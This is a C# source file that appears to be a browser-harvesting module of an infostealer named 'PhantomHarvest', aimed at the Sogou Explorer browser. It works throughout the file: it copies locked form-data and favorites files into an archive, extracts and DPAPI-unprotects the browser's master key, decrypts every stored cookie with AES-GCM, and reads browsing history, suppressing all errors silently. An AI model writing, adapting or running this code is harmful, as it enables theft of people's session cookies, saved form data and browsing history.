using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using PhantomHarvest.Helper;

namespace PhantomHarvest.Browsers
{
	// Token: 0x02000038 RID: 56
	internal static class OldSogou
	{
		public static void Collect(ArchiveManager zip)
		{
			try
			{
				if (!Directory.Exists(OldSogou.BrowserPath)) return;

				OldSogou.MasterKey = OldSogou.GetMasterKey();
				{
					try 
					{
						string formDataPath = Path.Combine(OldSogou.BrowserPath, "FormData3.dat");
						byte[] bytes = LockedFile.ReadLockedFile(formDataPath);
						if (bytes != null)
						{
							using (MemoryStream ms = new MemoryStream(bytes))
							{
								zip.AddStream(ArchiveManager.Compression.Deflate, OldSogou.BrowserName + "/FormData3.dat", ms, DateTime.Now, "");
							}
						}
					}
					catch {}
				}

				string favoritePath = Path.Combine(Directory.GetParent(Directory.GetParent(OldSogou.BrowserPath).FullName).FullName, "favorite3.dat");
				if (File.Exists(favoritePath))
				{
					try 
					{
						byte[] bytes = LockedFile.ReadLockedFile(favoritePath);
						if (bytes != null)
						{
							using (MemoryStream ms = new MemoryStream(bytes))
							{
								zip.AddStream(ArchiveManager.Compression.Deflate, OldSogou.BrowserName + "/favorite3.dat", ms, DateTime.Now, "");
							}
						}
					}
					catch {}
				}
			}
			catch
			{
			}
		}

		public static byte[] GetMasterKey()
		{
			string path = Path.Combine(Directory.GetParent(OldSogou.BrowserPath).FullName, "Local State");
			byte[] array = new byte[0];
			if (!File.Exists(path))
			{
				return null;
			}
			
			string content;
			try 
			{
				byte[] bytes = LockedFile.ReadLockedFile(path);
				content = bytes != null ? Encoding.UTF8.GetString(bytes) : File.ReadAllText(path);
			}
			catch { return null; }

			foreach (object obj in new Regex("\"encrypted_key\":\"(.*?)\"", RegexOptions.Compiled).Matches(content))
			{
				Match match = (Match)obj;
				if (match.Success)
				{
					array = Convert.FromBase64String(match.Groups[1].Value);
				}
			}
			byte[] array2 = new byte[array.Length - 5];
			Array.Copy(array, 5, array2, 0, array.Length - 5);
			byte[] result;
			try
			{
				result = ProtectedData.Unprotect(array2, null, DataProtectionScope.CurrentUser);
			}
			catch
			{
				result = null;
			}
			return result;
		}

		private static byte[] DecryptData(byte[] buffer)
		{
			byte[] result = null;
			if (OldSogou.MasterKey == null)
			{
				return null;
			}
			try
			{
				string @string = Encoding.Default.GetString(buffer);
				if (@string.StartsWith("v10") || @string.StartsWith("v11"))
				{
					byte[] array = new byte[12];
					Array.Copy(buffer, 3, array, 0, 12);
					byte[] array2 = new byte[buffer.Length - 15];
					Array.Copy(buffer, 15, array2, 0, buffer.Length - 15);
					byte[] array3 = new byte[16];
					Array.Copy(array2, array2.Length - 16, array3, 0, 16);
					byte[] array4 = new byte[array2.Length - array3.Length];
					Array.Copy(array2, 0, array4, 0, array2.Length - array3.Length);
					result = new AesGcm().Decrypt(OldSogou.MasterKey, array, null, array4, array3);
				}
				else
				{
					result = ProtectedData.Unprotect(buffer, null, DataProtectionScope.CurrentUser);
				}
			}
			catch
			{
			}
			return result;
		}

		public static string Sogou_cookies()
		{
			StringBuilder stringBuilder = new StringBuilder();
			string text = Path.Combine(OldSogou.BrowserPath, "Cookies");
			if (!File.Exists(text))
			{
				return null;
			}
			try
			{
				byte[] dbBytes = LockedFile.ReadLockedFile(text);
				if (dbBytes == null) return null;

				DataParser sqliteHandler = new DataParser(dbBytes);
				
				// Check for WAL
				string walPath = text + "-wal";
				if (File.Exists(walPath))
				{
					try
					{
						byte[] walBytes = LockedFile.ReadLockedFile(walPath);
						if (walBytes != null) sqliteHandler.ApplyWal(walBytes);
					}
					catch {}
				}

				if (!sqliteHandler.ReadTable("cookies"))
				{
					return null;
				}
				for (int i = 0; i < sqliteHandler.GetRowCount(); i++)
				{
					string value = sqliteHandler.GetValue(i, "host_key");
					string value2 = sqliteHandler.GetValue(i, "name");
					string value3 = sqliteHandler.GetValue(i, "encrypted_value");
					string @string = Encoding.UTF8.GetString(OldSogou.DecryptData(Convert.FromBase64String(value3)));
					stringBuilder.AppendLine(string.Concat(new string[]
					{
						"[",
						value,
						"] \t {",
						value2,
						"}={",
						@string,
						"}"
					}));
				}
			}
			catch
			{
			}
			return stringBuilder.ToString();
		}

		public static string Sogou_history()
		{
			StringBuilder stringBuilder = new StringBuilder();
			string text = Path.Combine(Directory.GetParent(Directory.GetParent(OldSogou.BrowserPath).FullName).FullName, "HistoryUrl3.db");
			if (!File.Exists(text))
			{
				return null;
			}
			try
			{
				byte[] dbBytes = LockedFile.ReadLockedFile(text);
				if (dbBytes == null) return null;

				DataParser sqliteHandler = new DataParser(dbBytes);
				
				// Check for WAL
				string walPath = text + "-wal";
				if (File.Exists(walPath))
				{
					try
					{
						byte[] walBytes = LockedFile.ReadLockedFile(walPath);
						if (walBytes != null) sqliteHandler.ApplyWal(walBytes);
					}
					catch {}
				}

				if (!sqliteHandler.ReadTable("UserRankUrl"))
				{
					return null;
				}
				for (int i = 0; i < sqliteHandler.GetRowCount(); i++)
				{
					string value = sqliteHandler.GetValue(i, "id");
					stringBuilder.AppendLine(value);
				}
			}
			catch
			{
			}
			return stringBuilder.ToString();
		}

		public static string BrowserName = "OldSogouExplorer";
		public static string BrowserPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SogouExplorer\\Webkit\\Default");
		public static byte[] MasterKey;
	}
}
